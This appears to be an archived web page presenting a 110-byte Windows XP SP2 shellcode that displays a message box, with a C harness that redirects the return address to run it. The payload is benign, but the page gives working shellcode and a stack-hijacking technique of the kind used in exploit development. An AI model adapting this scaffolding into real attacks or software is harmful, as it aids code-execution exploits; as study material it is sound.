<html><head><title>Windows - Pop up message box (XP/SP2) - 110 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Author : Omega7
Assembly Code : Steve Hanna
Changed by : Omega7
Description : It is 110 Byte Shellcode which Pops up Message Box Under Windows Xp SP2
If you Want to use it in any other Windows You need to change the address
that i have marked!

*/

#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

char shellcode[]=
&quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb&quot;
&quot;\x77\x1d\x80\x7c&quot;    //***LoadLibraryA(libraryname) IN WinXP sp2***
&quot;\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb&quot;
&quot;\x28\xac\x80\x7c&quot;   //***GetProcAddress(hmodule,functionname) IN sp2***
&quot;\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x06\x31\xd2\x52\x51&quot;
&quot;\x51\x52\xff\xd0\x31\xd2\x50\xb8\xa2\xca\x81\x7c\xff\xd0\xe8\xc4\xff&quot;
&quot;\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff&quot;
&quot;\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff&quot;
&quot;\xff\x4f\x6d\x65\x67\x61\x37\x4e&quot;;

/*MessageBox shellcode for Windoew xp sp2 */

int main ()
{
int *ret;
ret=(int *)&amp;ret+2;
printf(&quot;Shellcode Length is : %d&quot;,strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
